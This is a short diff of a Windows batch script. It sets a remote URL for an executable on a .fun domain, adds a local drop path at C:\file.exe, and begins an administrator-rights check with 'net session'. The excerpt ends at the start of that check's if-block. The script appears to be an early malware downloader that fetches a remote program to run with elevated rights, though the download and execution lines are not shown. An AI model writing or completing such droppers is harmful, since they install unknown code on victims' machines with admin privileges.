@@ -1,5 +1,6 @@
 @echo off
 set "url=https://severnew1.fun/file.exe"
+set "file=C:\file.exe"  :: Replace with the actual file path
 
 net session >nul 2>&1
 if not %errorlevel% == 0 (
